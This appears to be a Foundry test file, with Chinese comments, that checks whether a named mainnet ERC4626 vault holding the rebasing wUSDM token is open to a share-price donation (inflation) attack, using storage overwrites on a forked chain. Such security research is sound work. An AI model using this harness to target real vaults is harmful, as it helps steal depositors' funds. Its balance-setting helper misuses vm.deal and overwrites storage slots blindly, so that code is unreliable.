// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ===========================================================================
// Vault 0x57f5 Donation Attack PoC (wUSDM - Rebasing Token)
//
// @KeyInfo
// Vault Address: 0x57f5E098cad7a3d1eed53991d4d66c45c9af7812
// Deploy Block: 18,293,692
// Min Attack Block: 18,293,905 (+213 blocks initialization delay)
// Lending Platform: Compound v3, Morpho v1
// Asset: wUSDM (wrapped USDM - rebasing token)
//
// @SpecialHandling
// wUSDM 是 rebasing token，deal() 可能失败
// 需要使用 vm.store fallback 策略
//
// @AttackType
// ERC4626 Inflation Attack with Rebasing Token
//
// @Strategy
// fork 到 min_attack_block (18,293,905) 而不是部署区块
// 使用三级 fallback 策略设置 token 余额
// ===========================================================================

import "../basetest.sol";
import {IERC20} from "../interface.sol";

// ---------------------------------------------------------------------------
// 接口定义
// ---------------------------------------------------------------------------

interface IERC4626Vault is IERC20 {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
}

// ---------------------------------------------------------------------------
// 主测试合约
// ---------------------------------------------------------------------------

contract Vault_0x57f5_DonationPoC is BaseTestWithBalanceLog {
    // === 地址常量 ===
    IERC4626Vault internal constant VAULT = IERC4626Vault(0x57F5E098CaD7A3D1Eed53991D4d66C45C9AF7812);
    
    // === Fork 区块 - min_attack_block (有初始化延迟) ===
    uint256 internal constant DEPLOY_BLOCK = 18_293_692;
    uint256 internal constant MIN_ATTACK_BLOCK = 18_293_905; // +213 blocks

    // === 攻击参数 ===
    uint256 internal constant DONATION_AMOUNT = 1000 * 1e18; // 1000 tokens

    // === 测试账户 ===
    address internal constant ATTACKER = address(0xdead);
    address internal constant VICTIM = address(0xbeef);

    // === 运行时变量 ===
    IERC20 internal assetToken;
    uint256 internal actualForkBlock;
    uint8 internal assetDecimals;

    function setUp() public {
        // 使用 min_attack_block 而不是 deploy_block
        actualForkBlock = MIN_ATTACK_BLOCK;
        vm.createSelectFork("mainnet", actualForkBlock);
        
        // 获取底层资产
        address assetAddr = VAULT.asset();
        assetToken = IERC20(assetAddr);
        fundingToken = assetAddr;
        assetDecimals = _getDecimals(assetAddr);

        vm.label(address(VAULT), "Vault");
        vm.label(assetAddr, "wUSDM");
        vm.label(ATTACKER, "Attacker");
        vm.label(VICTIM, "Victim");

        // 打印初始状态
        emit log_string("=== Setup: Checking Vault State at Min Attack Block ===");
        emit log_string("NOTE: wUSDM is a rebasing token - special handling required");
        emit log_named_uint("Deploy Block", DEPLOY_BLOCK);
        emit log_named_uint("Min Attack Block", actualForkBlock);
        emit log_named_uint("Block Difference", actualForkBlock - DEPLOY_BLOCK);
        emit log_named_address("Vault", address(VAULT));
        emit log_named_address("Asset (wUSDM)", assetAddr);
        emit log_named_decimal_uint("Vault.totalSupply()", VAULT.totalSupply(), assetDecimals);
        emit log_named_decimal_uint("Vault.totalAssets()", VAULT.totalAssets(), assetDecimals);
        emit log_named_decimal_uint("wUSDM.balanceOf(vault)", assetToken.balanceOf(address(VAULT)), assetDecimals);
    }

    // =========================================================================
    // 辅助函数
    // =========================================================================
    function _getDecimals(address token) internal returns (uint8) {
        (bool success, bytes memory data) = token.staticcall(abi.encodeWithSignature("decimals()"));
        if (success && data.length > 0) {
            return abi.decode(data, (uint8));
        }
        return 18;
    }

    // 三级 fallback 策略设置 token 余额
    function _setTokenBalance(address token, address account, uint256 amount) internal {
        // Level 1: 尝试 deal()
        uint256 currentBalance = IERC20(token).balanceOf(account);
        try vm.deal(token, amount) {
            // deal() 成功，验证
            if (IERC20(token).balanceOf(account) == amount) {
                emit log_string("[INFO] Token balance set via deal()");
                return;
            }
        } catch {}

        // Level 2: 尝试常见 mapping slots
        for (uint256 i = 0; i < 10; i++) {
            bytes32 slot = keccak256(abi.encode(account, i));
            uint256 storedVal = uint256(vm.load(token, slot));
            
            if (storedVal == currentBalance && currentBalance > 0) {
                vm.store(token, slot, bytes32(amount));
                if (IERC20(token).balanceOf(account) == amount) {
                    emit log_named_uint("[INFO] Token balance set via slot", i);
                    return;
                }
            }
        }

        // Level 3: 使用 vm.record + vm.accesses 查找 slot
        vm.record();
        IERC20(token).balanceOf(account);
        (bytes32[] memory reads,) = vm.accesses(token);

        // EIP-1967 已知 slots —— 必须跳过
        bytes32 IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
        bytes32 BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;

        for (uint256 i = 0; i < reads.length; i++) {
            bytes32 slot = reads[i];
            if (slot == IMPL_SLOT || slot == ADMIN_SLOT || slot == BEACON_SLOT) continue;
            uint256 slotVal = uint256(slot);
            if (slotVal < 10) continue;

            uint256 storedVal = uint256(vm.load(token, slot));
            
            // 对于 rebasing token，存储的可能是 shares 而不是 balance
            if (storedVal > 0) {
                vm.store(token, slot, bytes32(amount));
                uint256 newBalance = IERC20(token).balanceOf(account);
                if (newBalance != currentBalance) {
                    emit log_string("[INFO] Token balance set via vm.accesses slot");
                    return;
                }
            }
        }

        // Fallback: 强制设置 slot 2
        bytes32 fallbackSlot = keccak256(abi.encode(account, uint256(2)));
        vm.store(token, fallbackSlot, bytes32(amount));
        emit log_string("[INFO] Token balance set via fallback slot 2");
    }

    // =========================================================================
    // Test 1: 验证 vault 的 donation 敏感性
    // =========================================================================
    function testDonationSensitivity() public {
        emit log_string("=== Test 1: Donation Sensitivity Check (Rebasing Token) ===");
        emit log_named_uint("Fork Block (Min Attack Block)", actualForkBlock);

        uint256 totalSupplyBefore = VAULT.totalSupply();
        uint256 totalAssetsBefore = VAULT.totalAssets();
        uint256 vaultBalanceBefore = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Supply Before", totalSupplyBefore, assetDecimals);
        emit log_named_decimal_uint("Total Assets Before", totalAssetsBefore, assetDecimals);
        emit log_named_decimal_uint("Vault Balance Before", vaultBalanceBefore, assetDecimals);

        // 验证 vault 状态
        if (totalSupplyBefore == 0) {
            emit log_string("[INFO] Vault is EMPTY at min_attack_block");
        } else {
            emit log_string("[INFO] Vault is NOT empty - initialization occurred");
        }

        // 使用 vm.store 给 vault 增加余额 (模拟 donation)
        _setTokenBalance(address(assetToken), address(VAULT), vaultBalanceBefore + DONATION_AMOUNT);

        uint256 totalAssetsAfter = VAULT.totalAssets();
        uint256 vaultBalanceAfter = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfter, assetDecimals);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, assetDecimals);

        // 检查 totalAssets 是否跟踪 balance
        uint256 assetIncrease = 0;
        if (totalAssetsAfter > totalAssetsBefore) {
            assetIncrease = totalAssetsAfter - totalAssetsBefore;
        }
        uint256 balanceIncrease = vaultBalanceAfter - vaultBalanceBefore;

        emit log_named_decimal_uint("Asset Increase", assetIncrease, assetDecimals);
        emit log_named_decimal_uint("Balance Increase", balanceIncrease, assetDecimals);

        if (assetIncrease == 0) {
            emit log_string("[INFO] totalAssets DID NOT change after donation");
            emit log_string("[FINDING] Vault uses INTERNAL ACCOUNTING (not balance-based)");
            emit log_string("[CONCLUSION] Classic donation attack NOT applicable");
        } else if (assetIncrease == balanceIncrease) {
            emit log_string("[OK] Vault is BALANCE-BASED (donation sensitive)");
            emit log_string("[WARNING] Vault may be VULNERABLE to donation attack");
        } else {
            emit log_string("[INFO] totalAssets changed but != balance increase");
            emit log_string("[FINDING] Vault has hybrid accounting");
        }

        // 断言
        require(assetIncrease == balanceIncrease || assetIncrease == 0, 
            "Unexpected vault behavior");
    }

    // =========================================================================
    // Test 2: 验证 donation 导致 share price 膨胀
    // =========================================================================
    function testDonationAttack() public balanceLog {
        emit log_string("=== Test 2: Donation Attack - Share Price Inflation ===");
        emit log_named_uint("Fork Block", actualForkBlock);

        uint256 totalSupplyBefore = VAULT.totalSupply();
        uint256 totalAssetsBefore = VAULT.totalAssets();

        emit log_named_decimal_uint("Initial Total Supply", totalSupplyBefore, assetDecimals);
        emit log_named_decimal_uint("Initial Total Assets", totalAssetsBefore, assetDecimals);

        // 执行 donation
        emit log_string("=== Simulating donation via vm.store ===");
        uint256 currentBalance = assetToken.balanceOf(address(VAULT));
        _setTokenBalance(address(assetToken), address(VAULT), currentBalance + DONATION_AMOUNT);

        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
        uint256 vaultBalanceAfter = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, assetDecimals);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, assetDecimals);

        // 分析结果
        uint256 assetIncrease = 0;
        if (totalAssetsAfterDonation > totalAssetsBefore) {
            assetIncrease = totalAssetsAfterDonation - totalAssetsBefore;
        }
        
        if (assetIncrease > 0) {
            emit log_string("[PASS] Donation successfully affected totalAssets");
            if (totalSupplyBefore > 0) {
                uint256 sharePriceBefore = totalAssetsBefore * 1e18 / totalSupplyBefore;
                uint256 sharePriceAfter = totalAssetsAfterDonation * 1e18 / totalSupplyBefore;
                uint256 inflationMultiplier = sharePriceAfter * 1e18 / sharePriceBefore;
                emit log_named_decimal_uint("Share Price Inflation (x)", inflationMultiplier, 18);
            }
        } else {
            emit log_string("[INFO] Donation had no effect on totalAssets");
            emit log_string("[PASS] Vault is IMMUNE to donation attack");
        }
    }

    // =========================================================================
    // Test 3: 完整攻击分析
    // =========================================================================
    function testFullAttackFlow() public balanceLog {
        emit log_string("============================================================");
        emit log_string("=== Test 3: Full Donation Attack Analysis ===");
        emit log_string("=== wUSDM Vault (Rebasing Token) ===");
        emit log_string("============================================================");
        emit log_named_uint("Deploy Block", DEPLOY_BLOCK);
        emit log_named_uint("Min Attack Block", actualForkBlock);
        emit log_named_uint("Block Difference", actualForkBlock - DEPLOY_BLOCK);

        // 记录初始状态
        uint256 initialTotalSupply = VAULT.totalSupply();
        uint256 initialTotalAssets = VAULT.totalAssets();
        uint256 initialVaultBalance = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Initial Total Supply", initialTotalSupply, assetDecimals);
        emit log_named_decimal_uint("Initial Total Assets", initialTotalAssets, assetDecimals);
        emit log_named_decimal_uint("Initial Vault Balance", initialVaultBalance, assetDecimals);

        // =============================================================
        // Step 1: 模拟 donation
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 1: Simulating donation ===");
        
        _setTokenBalance(address(assetToken), address(VAULT), initialVaultBalance + DONATION_AMOUNT);

        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
        uint256 vaultBalanceAfterDonation = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Donation Amount", DONATION_AMOUNT, assetDecimals);
        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, assetDecimals);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfterDonation, assetDecimals);

        // =============================================================
        // Step 2: 分析结果
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 2: Analyzing results ===");

        uint256 assetIncrease = 0;
        if (totalAssetsAfterDonation > initialTotalAssets) {
            assetIncrease = totalAssetsAfterDonation - initialTotalAssets;
        }
        uint256 balanceIncrease = vaultBalanceAfterDonation - initialVaultBalance;

        bool totalAssetsChanged = (assetIncrease > 0);
        bool totalAssetsEqualsBalanceIncrease = (assetIncrease == balanceIncrease);

        emit log_named_uint("Total Assets Changed", totalAssetsChanged ? 1 : 0);
        emit log_named_uint("Asset Increase == Balance Increase", totalAssetsEqualsBalanceIncrease ? 1 : 0);

        // =============================================================
        // 最终分析
        // =============================================================
        emit log_string("");
        emit log_string("============================================================");
        emit log_string("=== FINAL ANALYSIS ===");
        emit log_string("============================================================");

        if (totalAssetsChanged && totalAssetsEqualsBalanceIncrease) {
            emit log_string("");
            emit log_string("[FINDING 1] Donation increased vault balance");
            emit log_string("[FINDING 2] totalAssets increase == balance increase");
            emit log_string("");
            emit log_string("[CONCLUSION] Vault is BALANCE-BASED");
            emit log_string("             Classic donation attack is POSSIBLE");
            emit log_string("");
            emit log_string("[SECURITY STATUS] VULNERABLE to donation attack");
        } else if (!totalAssetsChanged) {
            emit log_string("");
            emit log_string("[FINDING] totalAssets did NOT change after donation");
            emit log_string("");
            emit log_string("[CONCLUSION] Vault uses INTERNAL ACCOUNTING");
            emit log_string("             Classic donation attack is NOT possible");
            emit log_string("");
            emit log_string("[SECURITY STATUS] IMMUNE to donation attack");
        } else {
            emit log_string("");
            emit log_string("[INFO] Vault has hybrid accounting");
            emit log_string("       Further investigation needed");
        }

        emit log_string("");
        emit log_string("============================================================");
        emit log_string("[OK] Analysis completed!");
        emit log_string("NOTE: wUSDM is a rebasing token");
        emit log_string("      Special handling was used for balance manipulation");
        emit log_string("============================================================");
    }
}
